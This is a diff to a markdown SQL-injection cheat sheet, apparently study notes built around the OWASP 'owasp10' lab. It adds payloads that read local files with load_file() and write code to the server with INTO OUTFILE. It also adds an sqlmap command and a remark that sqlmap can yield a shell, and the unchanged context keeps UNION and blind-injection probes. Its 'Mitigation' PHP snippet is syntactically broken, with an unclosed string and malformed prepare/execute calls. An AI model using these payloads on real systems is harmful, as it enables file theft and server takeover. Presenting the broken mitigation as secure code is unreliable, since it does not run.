@@ -7,6 +7,8 @@
   * **database()** - Name of the database
   * **user()** - User of the server
   * **version()** - OS version of the server
+  * **load_file('_path_')** - Load local file
+  * **Union Select null, _code_, null Into Outfile '_filePath_'** - Write into file (useful with local file vuln)
   * **Union Select 1, table_name, null, null, 5 From information_schema.tables** - Name of all the tables in the SQL
   * **Union Select 1, table_name, null, null, 5 From information_schema.tables Where table_schema = "owasp10"** - Name of all the tables in owasp10 database
   * **Union Select 1, column_name, null, null, 5 From information_schema.columns Where table_name = "accounts"** - Name of all the columns in accounts table
@@ -18,3 +20,19 @@
 * In a Blind SQL Injection, try to send a true and false value to see how the page behaves
   * True - **and 1=1** or **order by 1**
   * False - ** and 1=0** or **order by 10000000**
+
+### Auto SQL Injection
+* **$ sqlmap -u _"URL"_** - Find SQL injections automatically
+* We can get shell with **SQLMap**
+
+### Mitigation
+* [Fast way](https://github.com/KevinSantos/Hacking/blob/master/sqlInjectionMitigation.php)
+* Best way:
+   ```php
+   <?php
+   $hackerInput = "admin' union select #";
+
+   prepare("SELECT * FROM accounts WHERE username = ?);
+   execute(array('admin' union select #');
+   ?>
+   ```
